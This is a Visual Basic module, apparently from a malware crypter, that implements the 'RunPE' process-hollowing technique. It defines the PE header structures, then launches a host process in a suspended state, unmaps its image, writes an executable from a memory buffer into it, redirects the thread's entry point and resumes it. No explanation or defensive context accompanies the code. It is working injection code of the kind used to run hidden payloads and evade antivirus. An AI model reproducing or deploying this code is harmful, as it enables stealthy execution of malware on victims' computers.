Attribute VB_Name = "basRunPE"
Option Explicit

Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Public Const IMAGE_DOS_SIGNATURE = &H5A4D    '//MZ
Public Const IMAGE_OS2_SIGNATURE = &H454E    '//NE
Public Const IMAGE_OS2_SIGNATURE_LE = &H454C '//LE
Public Const IMAGE_VXD_SIGNATURE = &H454C    '//LE
Public Const IMAGE_NT_SIGNATURE = &H4550     '//PE00

Public Type IMAGE_DOS_HEADER
    e_magic As Integer        ' Magic number
    e_cblp As Integer         ' Bytes on last page of file
    e_cp As Integer           ' Pages in file
    e_crlc As Integer         ' Relocations
    e_cparhdr As Integer      ' Size of header in paragraphs
    e_minalloc As Integer     ' Minimum extra paragraphs needed
    e_maxalloc As Integer     ' Maximum extra paragraphs needed
    e_ss As Integer           ' Initial (relative) SS value
    e_sp As Integer           ' Initial SP value
    e_csum As Integer         ' Checksum
    e_ip As Integer           ' Initial IP value
    e_cs As Integer           ' Initial (relative) CS value
    e_lfarlc As Integer       ' File address of relocation table
    e_ovno As Integer         ' Overlay number
    e_res(0 To 3) As Integer  ' Reserved words
    e_oemid As Integer        ' OEM identifier (for e_oeminfo)
    e_oeminfo As Integer      ' OEM information; e_oemid specific
    e_res2(0 To 9) As Integer ' Reserved words
    e_lfanew As Long          ' File address of new exe header
End Type

Public Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    Characteristics As Integer
End Type

Public Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

Public Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Public Type IMAGE_OPTIONAL_HEADER
    ' Standard fields.
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUninitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    Win32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    Subsystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Public Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Public Const IMAGE_SIZEOF_SHORT_NAME = 8

Public Type IMAGE_SECTION_HEADER
    NameOfSection(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte
    VirtualSize As Long
    VirtualAddress As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLineNumbers As Long
    NumberOfRelocations As Integer
    NumberOfLineNumbers As Integer
    Characteristics As Long
End Type

Public Const OFFSET_4 = 4294967296#

Public Function RunPE(Buffer() As Byte) As Long
Dim IDH As IMAGE_DOS_HEADER
Dim INH As IMAGE_NT_HEADERS
Dim ISH As IMAGE_SECTION_HEADER
Dim PI As PROCESS_INFORMATION
Dim SI As STARTUPINFO
Dim CONTEXT As CONTEXT86
Dim i As Long
Dim Addr As Long
Dim ImageBase As Long
Dim BytesWritten As Long
Dim Offset As Long
    Call CopyMemory(IDH, Buffer(0), Len(IDH))
    If IDH.e_magic <> IMAGE_DOS_SIGNATURE Then
        Exit Function
    End If
    Call CopyMemory(INH, Buffer(IDH.e_lfanew), Len(INH))
    If INH.Signature <> IMAGE_NT_SIGNATURE Then
        Exit Function
    End If
    SI.cb = Len(SI)
    If CreateProcess(vbNullString, SystemDirectory & "\PELoader.exe", 0, 0, False, CREATE_SUSPENDED, 0, 0, SI, PI) = 0 Then
        Exit Function
    End If
    CONTEXT.ContextFlags = CONTEXT86_INTEGER
    If GetThreadContext(PI.hThread, CONTEXT) = 0 Then GoTo ClearProcess
    Call ReadProcessMemory(PI.hProcess, ByVal CONTEXT.Ebx + 8, Addr, 4, 0)
    If Addr = 0 Then GoTo ClearProcess
    If ZwUnmapViewOfSection(PI.hProcess, Addr) Then GoTo ClearProcess
    ImageBase = VirtualAllocEx(PI.hProcess, ByVal INH.OptionalHeader.ImageBase, INH.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    If ImageBase = 0 Then GoTo ClearProcess
    Call WriteProcessMemory(PI.hProcess, ByVal ImageBase, Buffer(0), INH.OptionalHeader.SizeOfHeaders, BytesWritten)
    Offset = IDH.e_lfanew + Len(INH)
    For i = 0 To INH.FileHeader.NumberOfSections - 1
        Call CopyMemory(ISH, Buffer(Offset + i * Len(ISH)), Len(ISH))
        Call WriteProcessMemory(PI.hProcess, ByVal ImageBase + ISH.VirtualAddress, Buffer(ISH.PointerToRawData), ISH.SizeOfRawData, BytesWritten)
        Call VirtualProtectEx(PI.hProcess, ByVal ImageBase + ISH.VirtualAddress, ISH.VirtualSize, Protect(ISH.Characteristics), Addr)
    Next i
    Call WriteProcessMemory(PI.hProcess, ByVal CONTEXT.Ebx + 8, ImageBase, 4, BytesWritten)
    CONTEXT.Eax = ImageBase + INH.OptionalHeader.AddressOfEntryPoint
    Call SetThreadContext(PI.hThread, CONTEXT)
    Call ResumeThread(PI.hThread)
    Exit Function
ClearProcess:
    Call CloseHandle(PI.hThread)
    Call CloseHandle(PI.hProcess)
End Function

Public Function Protect(ByVal Characteristics As Long) As Long
Dim Mapping As Variant
    Mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
    Protect = Mapping(RShift(Characteristics, 29))
End Function

Public Function RShift(ByVal Value As Long, ByVal NumberOfBitsToShift As Long) As Long
    RShift = vbLongToULong(Value) / (2 ^ NumberOfBitsToShift)
End Function

Public Function vbLongToULong(ByVal Value As Long) As Double
    If Value < 0 Then
        vbLongToULong = Value + OFFSET_4
    Else
        vbLongToULong = Value
    End If
End Function
